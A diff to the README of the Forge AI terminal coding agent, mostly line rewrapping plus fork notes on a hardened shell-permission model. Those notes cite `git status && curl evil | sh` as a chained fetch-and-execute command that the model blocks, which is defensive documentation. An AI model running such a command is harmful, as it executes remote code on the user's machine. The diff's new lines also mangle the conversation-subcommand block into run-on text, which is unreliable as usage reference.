@@ -1,19 +1,18 @@
-<h1 align="center">⚒️ Forge: AI-Enhanced Terminal Development Environment</h1>
-<p align="center">A comprehensive coding agent that integrates AI capabilities with your development environment</p>
+<h1 align="center">⚒️ Forge: AI-Enhanced Terminal Development Environment</h1> <p align="center">A comprehensive coding agent that integrates AI capabilities with your development
+environment</p>
 
 <p align="center"><code>curl -fsSL https://forgecode.dev/cli | sh</code></p>
 
-[![CI Status](https://img.shields.io/github/actions/workflow/status/tailcallhq/forgecode/ci.yml?style=for-the-badge)](https://github.com/tailcallhq/forgecode/actions)
-[![GitHub Release](https://img.shields.io/github/v/release/tailcallhq/forgecode?style=for-the-badge)](https://github.com/tailcallhq/forgecode/releases)
-[![Discord](https://img.shields.io/discord/1044859667798568962?style=for-the-badge&cacheSeconds=120&logo=discord)](https://discord.gg/kRZBPpkgwq)
-[![CLA assistant](https://cla-assistant.io/readme/badge/tailcallhq/forgecode?style=for-the-badge)](https://cla-assistant.io/tailcallhq/forgecode)
+[![CI Status](https://img.shields.io/github/actions/workflow/status/tailcallhq/forgecode/ci.yml?style=for-the-badge)](https://github.com/tailcallhq/forgecode/actions) [![GitHub
+Release](https://img.shields.io/github/v/release/tailcallhq/forgecode?style=for-the-badge)](https://github.com/tailcallhq/forgecode/releases)
+[![Discord](https://img.shields.io/discord/1044859667798568962?style=for-the-badge&cacheSeconds=120&logo=discord)](https://discord.gg/kRZBPpkgwq) [![CLA
+assistant](https://cla-assistant.io/readme/badge/tailcallhq/forgecode?style=for-the-badge)](https://cla-assistant.io/tailcallhq/forgecode)
 
 ![Code-Forge Demo](https://assets.antinomy.ai/images/forge_demo_2x.gif)
 
 ---
 
-<details>
-<summary><strong>Table&nbsp;of&nbsp;Contents</strong></summary>
+<details> <summary><strong>Table&nbsp;of&nbsp;Contents</strong></summary>
 
 - [Quickstart](#quickstart)
 - [Usage Examples](#usage-examples)
@@ -69,27 +68,27 @@ forge provider login
 # Then start Forge
 forge
 ```
+
 That's it! Forge is now ready to assist you with your development tasks.
 
 ## Usage Examples
 
 Forge can be used in different ways depending on your needs. Here are some common usage patterns:
 
-<details>
-<summary><strong>Code Understanding</strong></summary>
+<details> <summary><strong>Code Understanding</strong></summary>
 
-```
+```text
 > Can you explain how the authentication system works in this codebase?
 ```
 
-Forge will analyze your project's structure, identify authentication-related files, and provide a detailed explanation of the authentication flow, including the relationships between different components.
+Forge will analyze your project's structure, identify authentication-related files, and provide a detailed explanation of the authentication flow, including the relationships between
+different components.
 
 </details>
 
-<details>
-<summary><strong>Implementing New Features</strong></summary>
+<details> <summary><strong>Implementing New Features</strong></summary>
 
-```
+```text
 > I need to add a dark mode toggle to our React application. How should I approach this?
 ```
 
@@ -97,10 +96,9 @@ Forge will suggest the best approach based on your current codebase, explain the
 
 </details>
 
-<details>
-<summary><strong>Debugging Assistance</strong></summary>
+<details> <summary><strong>Debugging Assistance</strong></summary>
 
-```
+```text
 > I'm getting this error: "TypeError: Cannot read property 'map' of undefined". What might be causing it?
 ```
 
@@ -108,10 +106,9 @@ Forge will analyze the error, suggest potential causes based on your code, and p
 
 </details>
 
-<details>
-<summary><strong>Code Reviews</strong></summary>
+<details> <summary><strong>Code Reviews</strong></summary>
 
-```
+```text
 > Please review the code in src/components/UserProfile.js and suggest improvements
 ```
 
@@ -119,10 +116,9 @@ Forge will analyze the code, identify potential issues, and suggest improvements
 
 </details>
 
-<details>
-<summary><strong>Learning New Technologies</strong></summary>
+<details> <summary><strong>Learning New Technologies</strong></summary>
 
-```
+```text
 > I want to integrate GraphQL into this Express application. Can you explain how to get started?
 ```
 
@@ -130,10 +126,9 @@ Forge will provide a tailored tutorial on integrating GraphQL with Express, usin
 
 </details>
 
-<details>
-<summary><strong>Database Schema Design</strong></summary>
+<details> <summary><strong>Database Schema Design</strong></summary>
 
-```
+```text
 > I need to design a database schema for a blog with users, posts, comments, and categories
 ```
 
@@ -141,10 +136,9 @@ Forge will suggest an appropriate schema design, including tables/collections, r
 
 </details>
 
-<details>
-<summary><strong>Refactoring Legacy Code</strong></summary>
+<details> <summary><strong>Refactoring Legacy Code</strong></summary>
 
-```
+```text
 > Help me refactor this class-based component to use React Hooks
 ```
 
@@ -152,10 +146,9 @@ Forge can help modernize your codebase by walking you through refactoring steps 
 
 </details>
 
-<details>
-<summary><strong>Git Operations</strong></summary>
+<details> <summary><strong>Git Operations</strong></summary>
 
-```
+```text
 > I need to merge branch 'feature/user-profile' into main but there are conflicts
 ```
 
@@ -183,7 +176,8 @@ Forge has three distinct ways to use it. Understanding this distinction upfront 
 
 ### Interactive Mode (TUI)
 
-Running `forge` with no arguments starts the interactive terminal UI, a persistent session where you type prompts and the AI responds in a conversational loop. This is the primary way to do multi-step work.
+Running `forge` with no arguments starts the interactive terminal UI, a persistent session where you type prompts and the AI responds in a conversational loop. This is the primary way to do
+multi-step work.
 
 ```bash
 forge                              # Start a new interactive session
@@ -209,11 +203,13 @@ forge commit --preview               # Generate commit message, print it, then e
 forge suggest "find large log files" # Translate natural language to a shell command, then exit
 ```
 
-> **Note:** `forge conversation resume <id>` opens the interactive TUI. It does **not** just print a message and exit. If you run it and see the cursor waiting, you are inside the interactive session. Type your prompt or press `Ctrl+C` to exit.
+> **Note:** `forge conversation resume <id>` opens the interactive TUI. It does **not** just print a message and exit. If you run it and see the cursor waiting, you are inside the
+> interactive session. Type your prompt or press `Ctrl+C` to exit.
 
 ### ZSH Plugin Mode (`:` prefix)
 
-Install the ZSH plugin once with `forge setup`, then use `:` commands directly at your shell prompt without ever typing `forge`. This is the fastest mode for day-to-day development: send prompts, switch conversations, commit, and suggest commands without leaving your shell.
+Install the ZSH plugin once with `forge setup`, then use `:` commands directly at your shell prompt without ever typing `forge`. This is the fastest mode for day-to-day development: send
+prompts, switch conversations, commit, and suggest commands without leaving your shell.
 
 ```zsh
 : refactor the auth module      # Send a prompt to the active agent
@@ -228,7 +224,8 @@ See the full [ZSH Plugin reference below](#zsh-plugin-the--prefix-system) for al
 
 ## ZSH Plugin: The `:` Prefix System
 
-When you install the ZSH plugin (`forge setup`), you get a `:` prefix command system at your shell prompt. This is the fastest way to use Forge during normal development; you never leave your shell.
+When you install the ZSH plugin (`forge setup`), you get a `:` prefix command system at your shell prompt. This is the fastest way to use Forge during normal development; you never leave
+your shell.
 
 **How it works:** Lines starting with `:` are intercepted before the shell sees them and routed to Forge. Everything else runs normally.
 
@@ -353,11 +350,14 @@ Project-local skills override global ones, which override built-in ones. To scaf
 
 ### Customizing Agent Behavior
 
-**`AGENTS.md`:** Create this file in your project root (or `~/forge/AGENTS.md` globally) to give all agents persistent instructions such as coding conventions, commit message style, and things to avoid. Forge reads it automatically at the start of every conversation.
+**`AGENTS.md`:** Create this file in your project root (or `~/forge/AGENTS.md` globally) to give all agents persistent instructions such as coding conventions, commit message style, and
+things to avoid. Forge reads it automatically at the start of every conversation.
 
-**Custom agents:** Place a `.md` file with YAML front-matter in `.forge/agents/` (project) or `~/forge/agents/` (global) to define additional agents with their own models, tools, and system prompts. Project-local agents override global ones. The built-in agent files in `crates/forge_repo/src/agents/` are good examples of the format.
+**Custom agents:** Place a `.md` file with YAML front-matter in `.forge/agents/` (project) or `~/forge/agents/` (global) to define additional agents with their own models, tools, and system
+prompts. Project-local agents override global ones. The built-in agent files in `crates/forge_repo/src/agents/` are good examples of the format.
 
-**Custom commands:** Place YAML files in `.forge/commands/` (project) or `~/forge/commands/` (global) to define shortcut commands available via `:commandname`. Commands can also be defined inline in `forge.yaml` under the `commands:` key.
+**Custom commands:** Place YAML files in `.forge/commands/` (project) or `~/forge/commands/` (global) to define shortcut commands available via `:commandname`. Commands can also be defined
+inline in `forge.yaml` under the `commands:` key.
 
 ### Semantic Search (Workspace)
 
@@ -368,26 +368,26 @@ Project-local skills override global ones, which override built-in ones. To scaf
 :workspace-info           # Show workspace details
 ```
 
-After running `:sync`, the AI can search your codebase by meaning rather than exact text matches. Indexing sends file content to the workspace server, which defaults to `https://api.forgecode.dev`. Set `FORGE_WORKSPACE_SERVER_URL` to override this if self-hosting.
+After running `:sync`, the AI can search your codebase by meaning rather than exact text matches. Indexing sends file content to the workspace server, which defaults to
+`https://api.forgecode.dev`. Set `FORGE_WORKSPACE_SERVER_URL` to override this if self-hosting.
 
 ### Quick Reference: All `:` Commands
 
-
 | Command | Alias | What it does |
 |---|---|---|
-| `: <prompt>` | | Send prompt to active agent |
+| `: <prompt>` |  | Send prompt to active agent |
 | `:new` | `:n` | Start new conversation |
 | `:conversation` | `:c` | Browse/switch conversations (interactive picker) |
-| `:conversation -` | | Toggle to previous conversation |
-| `:clone` | | Branch current conversation |
+| `:conversation -` |  | Toggle to previous conversation |
+| `:clone` |  | Branch current conversation |
 | `:rename <name>` | `:rn` | Rename current conversation |
-| `:conversation-rename` | | Rename conversation (interactive picker) |
+| `:conversation-rename` |  | Rename conversation (interactive picker) |
 | `:retry` | `:r` | Retry last prompt |
-| `:copy` | | Copy last response to clipboard |
+| `:copy` |  | Copy last response to clipboard |
 | `:dump` | `:d` | Export conversation as JSON |
-| `:compact` | | Compact context |
-| `:commit` | | AI commit (immediate) |
-| `:commit-preview` | | AI commit (review first) |
+| `:compact` |  | Compact context |
+| `:commit` |  | AI commit (immediate) |
+| `:commit-preview` |  | AI commit (review first) |
 | `:suggest <desc>` | `:s` | Translate natural language to command |
 | `:edit` | `:ed` | Compose prompt in $EDITOR |
 | `:sage <prompt>` | `:ask` | Q&A / code understanding agent |
@@ -400,11 +400,11 @@ After running `:sync`, the AI can search your codebase by meaning rather than ex
 | `:info` | `:i` | Show session info |
 | `:sync` | `:workspace-sync` | Index codebase for semantic search |
 | `:tools` | `:t` | List available tools |
-| `:skill` | | List available skills |
+| `:skill` |  | List available skills |
 | `:login` | `:provider-login` | Login to a provider |
-| `:logout` | | Logout from a provider |
+| `:logout` |  | Logout from a provider |
 | `:keyboard-shortcuts` | `:kb` | Show keyboard shortcuts |
-| `:doctor` | | Run shell environment diagnostics |
+| `:doctor` |  | Run shell environment diagnostics |
 
 ---
 
@@ -412,35 +412,27 @@ After running `:sync`, the AI can search your codebase by meaning rather than ex
 
 Here's a quick reference of Forge's command-line options:
 
-| Option                              | Description                                                              |
-| ----------------------------------- | ------------------------------------------------------------------------ |
-| `-p, --prompt <PROMPT>`             | Direct prompt to process without entering interactive mode               |
-| `-e, --event <EVENT>`               | Dispatch an event to the workflow in JSON format                         |
-| `--conversation <CONVERSATION>`     | Path to a JSON file containing the conversation to execute               |
-| `--conversation-id <ID>`            | Resume or continue an existing conversation by ID                        |
-| `--agent <AGENT>`                   | Agent ID to use for this session                                         |
-| `-C, --directory <DIR>`             | Change to this directory before starting                                 |
-| `--sandbox <NAME>`                  | Create an isolated git worktree + branch for safe experimentation        |
-| `--verbose`                         | Enable verbose logging output                                            |
-| `-h, --help`                        | Print help information                                                   |
-| `-V, --version`                     | Print version                                                            |
+| Option | Description |
+|---|---|
+| `-p, --prompt <PROMPT>` | Direct prompt to process without entering interactive mode |
+| `-e, --event <EVENT>` | Dispatch an event to the workflow in JSON format |
+| `--conversation <CONVERSATION>` | Path to a JSON file containing the conversation to execute |
+| `--conversation-id <ID>` | Resume or continue an existing conversation by ID |
+| `--agent <AGENT>` | Agent ID to use for this session |
+| `-C, --directory <DIR>` | Change to this directory before starting |
+| `--sandbox <NAME>` | Create an isolated git worktree + branch for safe experimentation |
+| `--verbose` | Enable verbose logging output |
+| `-h, --help` | Print help information |
+| `-V, --version` | Print version |
 
 ### Subcommands
 
 ```bash
 # Conversations
-forge conversation list                  # List all saved conversations
-forge conversation resume <id>           # Resume a conversation in interactive mode
-forge conversation new                   # Create a new conversation ID (prints it)
-forge conversation dump <id>             # Export conversation as JSON
-forge conversation compact <id>          # Compact conversation context
-forge conversation retry <id>            # Retry last message
-forge conversation clone <id>            # Clone a conversation
-forge conversation rename <id> <name>    # Rename a conversation
-forge conversation delete <id>           # Delete a conversation permanently
-forge conversation info <id>             # Show conversation details
-forge conversation stats <id>            # Show token usage statistics
-forge conversation show <id>             # Show last assistant message
+forge conversation list # List all saved conversations forge conversation resume <id> # Resume a conversation in interactive mode forge conversation new # Create a new conversation ID
+(prints it) forge conversation dump <id> # Export conversation as JSON forge conversation compact <id> # Compact conversation context forge conversation retry <id> # Retry last message forge
+conversation clone <id> # Clone a conversation forge conversation rename <id> <name> # Rename a conversation forge conversation delete <id> # Delete a conversation permanently forge
+conversation info <id> # Show conversation details forge conversation stats <id> # Show token usage statistics forge conversation show <id> # Show last assistant message
 
 # Commits
 forge commit                             # Generate AI commit message and commit
@@ -514,11 +506,9 @@ forge provider list
 
 For backward compatibility, Forge still supports environment variables. On first run, any credentials found in environment variables will be automatically migrated to file-based storage.
 
-<details>
-<summary><strong>Legacy Environment Variable Setup (Deprecated)</strong></summary>
+<details> <summary><strong>Legacy Environment Variable Setup (Deprecated)</strong></summary>
 
-<details>
-<summary><strong>OpenRouter</strong></summary>
+<details> <summary><strong>OpenRouter</strong></summary>
 
 ```bash
 # .env
@@ -527,8 +517,7 @@ OPENROUTER_API_KEY=<your_openrouter_api_key>
 
 </details>
 
-<details>
-<summary><strong>Requesty</strong></summary>
+<details> <summary><strong>Requesty</strong></summary>
 
 ```bash
 # .env
@@ -537,8 +526,7 @@ REQUESTY_API_KEY=<your_requesty_api_key>
 
 </details>
 
-<details>
-<summary><strong>x-ai</strong></summary>
+<details> <summary><strong>x-ai</strong></summary>
 
 ```bash
 # .env
@@ -547,8 +535,7 @@ XAI_API_KEY=<your_xai_api_key>
 
 </details>
 
-<details>
-<summary><strong>z.ai</strong></summary>
+<details> <summary><strong>z.ai</strong></summary>
 
 ```bash
 # .env
@@ -560,8 +547,7 @@ ZAI_CODING_API_KEY=<your_zai_coding_api_key>
 
 </details>
 
-<details>
-<summary><strong>Cerebras</strong></summary>
+<details> <summary><strong>Cerebras</strong></summary>
 
 ```bash
 # .env
@@ -570,8 +556,7 @@ CEREBRAS_API_KEY=<your_cerebras_api_key>
 
 </details>
 
-<details>
-<summary><strong>Neuralwatt</strong></summary>
+<details> <summary><strong>Neuralwatt</strong></summary>
 
 ```bash
 # .env
@@ -580,8 +565,7 @@ NEURALWATT_API_KEY=<your_neuralwatt_api_key>
 
 </details>
 
-<details>
-<summary><strong>OrcaRouter</strong></summary>
+<details> <summary><strong>OrcaRouter</strong></summary>
 
 ```bash
 # .env
@@ -590,8 +574,7 @@ ORCAROUTER_API_KEY=<your_orcarouter_api_key>
 
 </details>
 
-<details>
-<summary><strong>Meta</strong></summary>
+<details> <summary><strong>Meta</strong></summary>
 
 ```bash
 # .env
@@ -605,8 +588,7 @@ model: muse-spark-1.1
 
 </details>
 
-<details>
-<summary><strong>IO Intelligence</strong></summary>
+<details> <summary><strong>IO Intelligence</strong></summary>
 
 ```bash
 # .env
@@ -620,8 +602,7 @@ model: meta-llama/Llama-3.3-70B-Instruct
 
 </details>
 
-<details>
-<summary><strong>OpenAI</strong></summary>
+<details> <summary><strong>OpenAI</strong></summary>
 
 ```bash
 # .env
@@ -635,8 +616,7 @@ model: o3-mini-high
 
 </details>
 
-<details>
-<summary><strong>Anthropic</strong></summary>
+<details> <summary><strong>Anthropic</strong></summary>
 
 ```bash
 # .env
@@ -650,8 +630,7 @@ model: claude-3.7-sonnet
 
 </details>
 
-<details>
-<summary><strong>Google Vertex AI</strong></summary>
+<details> <summary><strong>Google Vertex AI</strong></summary>
 
 **Setup Instructions:**
 
@@ -690,6 +669,7 @@ model: google/gemini-2.5-pro
 ```
 
 **Available Models:**
+
 - Claude models: `claude-sonnet-4@20250514`
 - Gemini models: `gemini-2.5-pro`, `gemini-2.0-flash`
 
@@ -697,8 +677,7 @@ Use the `/model` command in Forge CLI to see all available models.
 
 </details>
 
-<details>
-<summary><strong>OpenAI-Compatible Providers</strong></summary>
+<details> <summary><strong>OpenAI-Compatible Providers</strong></summary>
 
 ```bash
 # .env
@@ -713,8 +692,7 @@ model: <provider-specific-model>
 
 </details>
 
-<details>
-<summary><strong>Groq</strong></summary>
+<details> <summary><strong>Groq</strong></summary>
 
 ```bash
 # .env
@@ -729,8 +707,7 @@ model: deepseek-r1-distill-llama-70b
 
 </details>
 
-<details>
-<summary><strong>Amazon Bedrock</strong></summary>
+<details> <summary><strong>Amazon Bedrock</strong></summary>
 
 To use Amazon Bedrock models with Forge, you'll need to first set up the [Bedrock Access Gateway](https://github.com/aws-samples/bedrock-access-gateway):
 
@@ -763,8 +740,7 @@ model: anthropic.claude-3-opus
 
 </details>
 
-<details>
-<summary><strong>ForgeCode Services</strong></summary>
+<details> <summary><strong>ForgeCode Services</strong></summary>
 
 ```bash
 # .env
@@ -788,8 +764,7 @@ model: claude-3.7-sonnet
 
 Forge supports several environment variables for advanced configuration and fine-tuning. These can be set in your `.env` file or system environment.
 
-<details>
-<summary><strong>Retry Configuration</strong></summary>
+<details> <summary><strong>Retry Configuration</strong></summary>
 
 Control how Forge handles retry logic for failed requests:
 
@@ -804,8 +779,7 @@ FORGE_RETRY_STATUS_CODES=429,500,502   # HTTP status codes to retry (default: 42
 
 </details>
 
-<details>
-<summary><strong>HTTP Configuration</strong></summary>
+<details> <summary><strong>HTTP Configuration</strong></summary>
 
 Fine-tune HTTP client behavior for API requests:
 
@@ -828,12 +802,12 @@ FORGE_HTTP_ACCEPT_INVALID_CERTS=false      # Accept invalid certificates (defaul
 FORGE_HTTP_ROOT_CERT_PATHS=/path/to/cert1.pem,/path/to/cert2.crt  # Paths to root certificate files (PEM, CRT, CER format), multiple paths separated by commas
 ```
 
-> **⚠️ Security Warning**: Setting `FORGE_HTTP_ACCEPT_INVALID_CERTS=true` disables SSL/TLS certificate verification, which can expose you to man-in-the-middle attacks. Only use this in development environments or when you fully trust the network and endpoints.
+> **⚠️ Security Warning**: Setting `FORGE_HTTP_ACCEPT_INVALID_CERTS=true` disables SSL/TLS certificate verification, which can expose you to man-in-the-middle attacks. Only use this in
+> development environments or when you fully trust the network and endpoints.
 
 </details>
 
-<details>
-<summary><strong>API Configuration</strong></summary>
+<details> <summary><strong>API Configuration</strong></summary>
 
 Override default API endpoints and provider/model settings:
 
@@ -845,8 +819,7 @@ FORGE_WORKSPACE_SERVER_URL=http://localhost:8080  # URL for the indexing server 
 
 </details>
 
-<details>
-<summary><strong>Tool Configuration</strong></summary>
+<details> <summary><strong>Tool Configuration</strong></summary>
 
 Configuring the tool calls settings:
 
@@ -860,8 +833,7 @@ FORGE_DEBUG_REQUESTS=/path/to/debug/requests.json  # Write debug HTTP request fi
 
 </details>
 
-<details>
-<summary><strong>ZSH Plugin Configuration</strong></summary>
+<details> <summary><strong>ZSH Plugin Configuration</strong></summary>
 
 Configure the ZSH plugin behavior:
 
@@ -874,8 +846,7 @@ The `FORGE_BIN` environment variable allows you to customize the command used by
 
 </details>
 
-<details>
-<summary><strong>Display Configuration</strong></summary>
+<details> <summary><strong>Display Configuration</strong></summary>
 
 Configure display options for the Forge UI and ZSH theme:
 
@@ -887,12 +858,12 @@ NERD_FONT=1                       # Enable Nerd Font icons in ZSH theme (default
 USE_NERD_FONT=1                   # Alternative variable for enabling Nerd Font icons (same behavior as NERD_FONT)
 ```
 
-The `FORGE_CURRENCY_SYMBOL` and `FORGE_CURRENCY_CONVERSION_RATE` variables control how costs are displayed in the ZSH theme right prompt. Use these to customize the currency display for your region or preferred currency.
+The `FORGE_CURRENCY_SYMBOL` and `FORGE_CURRENCY_CONVERSION_RATE` variables control how costs are displayed in the ZSH theme right prompt. Use these to customize the currency display for your
+region or preferred currency.
 
 </details>
 
-<details>
-<summary><strong>System Configuration</strong></summary>
+<details> <summary><strong>System Configuration</strong></summary>
 
 System-level environment variables (usually set automatically):
 
@@ -911,8 +882,7 @@ COMSPEC=cmd.exe                        # Command processor to use (Windows)
 
 </details>
 
-<details>
-<summary><strong>Semantic Search Configuration</strong></summary>
+<details> <summary><strong>Semantic Search Configuration</strong></summary>
 
 Configure semantic search behavior for code understanding:
 
@@ -924,8 +894,7 @@ FORGE_SEM_SEARCH_TOP_K=20             # Top-k parameter for relevance filtering 
 
 </details>
 
-<details>
-<summary><strong>Logging Configuration</strong></summary>
+<details> <summary><strong>Logging Configuration</strong></summary>
 
 Configure logging verbosity and output:
 
@@ -935,6 +904,7 @@ FORGE_LOG=forge=info                  # Log filter level (default: forge=debug w
 ```
 
 The `FORGE_LOG` variable controls the logging level for Forge's internal operations using the standard tracing filter syntax. Common values:
+
 - `forge=error` - Only errors
 - `forge=warn` - Warnings and errors
 - `forge=info` - Informational messages (default when tracking enabled)
@@ -943,8 +913,7 @@ The `FORGE_LOG` variable controls the logging level for Forge's internal operati
 
 </details>
 
-<details>
-<summary><strong>Tracking Configuration</strong></summary>
+<details> <summary><strong>Tracking Configuration</strong></summary>
 
 Control tracking of user-identifying metadata in telemetry events:
 
@@ -959,8 +928,7 @@ The `FORGE_TRACKER` variable controls whether tracking enrichment metadata is in
 
 The `forge.yaml` file supports several advanced configuration options that let you customize Forge's behavior.
 
-<details>
-<summary><strong>Custom Rules</strong></summary>
+<details> <summary><strong>Custom Rules</strong></summary>
 
 Add your own guidelines that all agents should follow when generating responses.
 
@@ -974,8 +942,7 @@ custom_rules: |
 
 </details>
 
-<details>
-<summary><strong>Commands</strong></summary>
+<details> <summary><strong>Commands</strong></summary>
 
 Define custom commands as shortcuts for repetitive prompts:
 
@@ -989,8 +956,7 @@ commands:
 
 </details>
 
-<details>
-<summary><strong>Model</strong></summary>
+<details> <summary><strong>Model</strong></summary>
 
 Specify the default AI model to use for all agents in the workflow.
 
@@ -1001,8 +967,7 @@ model: "claude-3.7-sonnet"
 
 </details>
 
-<details>
-<summary><strong>Max Walker Depth</strong></summary>
+<details> <summary><strong>Max Walker Depth</strong></summary>
 
 Control how deeply Forge traverses your project directory structure when gathering context.
 
@@ -1013,21 +978,20 @@ max_walker_depth: 3 # Limit directory traversal to 3 levels deep
 
 </details>
 
-<details>
-<summary><strong>Temperature</strong></summary>
+<details> <summary><strong>Temperature</strong></summary>
 
-Adjust the creativity and randomness in AI responses. Lower values (0.0-0.3) produce more focused, deterministic outputs, while higher values (0.7-2.0) generate more diverse and creative results.
+Adjust the creativity and randomness in AI responses. Lower values (0.0-0.3) produce more focused, deterministic outputs, while higher values (0.7-2.0) generate more diverse and creative
+results.
 
 ```yaml
 # forge.yaml
 temperature: 0.7 # Balanced creativity and focus
 ```
 
-</details>
-<details>
-<summary><strong>Tool Max Failure Limit</strong></summary>
+</details> <details> <summary><strong>Tool Max Failure Limit</strong></summary>
 
-Control how many times a tool can fail before Forge forces completion to prevent infinite retry loops. This helps avoid situations where an agent gets stuck repeatedly trying the same failing operation.
+Control how many times a tool can fail before Forge forces completion to prevent infinite retry loops. This helps avoid situations where an agent gets stuck repeatedly trying the same
+failing operation.
 
 ```yaml
 # forge.yaml
@@ -1038,8 +1002,7 @@ Set to a higher value if you want more retry attempts, or lower if you want fast
 
 </details>
 
-<details>
-<summary><strong>Max Requests Per Turn</strong></summary>
+<details> <summary><strong>Max Requests Per Turn</strong></summary>
 
 Limit the maximum number of requests an agent can make in a single conversation turn. This prevents runaway conversations and helps control API usage and costs.
 
@@ -1058,10 +1021,10 @@ When this limit is reached, Forge will:
 
 ---
 
-<details>
-<summary><strong>Model Context Protocol (MCP)</strong></summary>
+<details> <summary><strong>Model Context Protocol (MCP)</strong></summary>
 
-The MCP feature allows AI agents to communicate with external tools and services. This implementation follows Anthropic's [Model Context Protocol](https://docs.anthropic.com/en/docs/claude-code/tutorials#set-up-model-context-protocol-mcp) design.
+The MCP feature allows AI agents to communicate with external tools and services. This implementation follows Anthropic's [Model Context
+Protocol](https://docs.anthropic.com/en/docs/claude-code/tutorials#set-up-model-context-protocol-mcp) design.
 
 ### MCP Configuration
 
@@ -1125,33 +1088,21 @@ MCP tools can be used as part of multi-agent workflows, allowing specialized age
 
 ## Fork Notes (`mymain` vs `main`)
 
-This repository is a fork. The default working branch is **`mymain`**, which
-is a strict superset of upstream **`main`** (`antinomyhq/forgecode`): there
-are **zero** commits upstream that are not in `mymain`. What `mymain` adds:
+This repository is a fork. The default working branch is **`mymain`**, which is a strict superset of upstream **`main`** (`antinomyhq/forgecode`): there are **zero** commits upstream that
+are not in `mymain`. What `mymain` adds:
 
-- `Justfile` and `.just/helpers/` -- the developer task runner. One gate:
-  `just ci`.
-- `cli` -- forked POSIX-sh installer that fixes a bug where the upstream
-  installer would clobber existing shell RC files even when `~/.local/bin`
-  was already on `PATH`.
-- `shell-plugin/bash/` and `shell-plugin/fish/` -- ports of the zsh plugin,
-  with the parity work documented under `docs/shell-parity/`.
-- `crates/forge_main/src/frontend/` -- a structured protocol that lets an
-  external frontend (GNU Emacs) drive Forge; see `docs/frontend-protocol.md`.
-- A hardened shell-command permission model: restricted mode on by default,
-  commands and URL fetches confirmed rather than allowed, and execute rules
-  matched per simple command so `git *` cannot auto-allow
-  `git status && curl evil | sh`.
-- Fork-only planning and research material under `plans/`,
-  `docs/shell-parity/`, `exec-harness/` and `.beads/`.
+- `Justfile` and `.just/helpers/` -- the developer task runner. One gate: `just ci`.
+- `cli` -- forked POSIX-sh installer that fixes a bug where the upstream installer would clobber existing shell RC files even when `~/.local/bin` was already on `PATH`.
+- `shell-plugin/bash/` and `shell-plugin/fish/` -- ports of the zsh plugin, with the parity work documented under `docs/shell-parity/`.
+- `crates/forge_main/src/frontend/` -- a structured protocol that lets an external frontend (GNU Emacs) drive Forge; see `docs/frontend-protocol.md`.
+- A hardened shell-command permission model: restricted mode on by default, commands and URL fetches confirmed rather than allowed, and execute rules matched per simple command so `git *`
+  cannot auto-allow `git status && curl evil | sh`.
+- Fork-only planning and research material under `plans/`, `docs/shell-parity/`, `exec-harness/` and `.beads/`.
 
-The compiled `forge` binary is **not** behaviourally identical to upstream's:
-the permission-model changes above are deliberate divergences. See
-[`docs/fork-differences.md`](docs/fork-differences.md) for the full breakdown
-and rationale.
+The compiled `forge` binary is **not** behaviourally identical to upstream's: the permission-model changes above are deliberate divergences. See
+[`docs/fork-differences.md`](docs/fork-differences.md) for the full breakdown and rationale.
 
-Reproduce the comparison locally (`origin` is the fork; upstream code lives on
-the `upstream` remote):
+Reproduce the comparison locally (`origin` is the fork; upstream code lives on the `upstream` remote):
 
 ```bash
 git fetch upstream
@@ -1195,4 +1146,3 @@ Your support drives Forge's continued evolution! By starring our GitHub reposito
 - Motivate our development team 💪
 - Enable us to prioritize new features 🛠️
 - Strengthen our open-source community 🌱
-
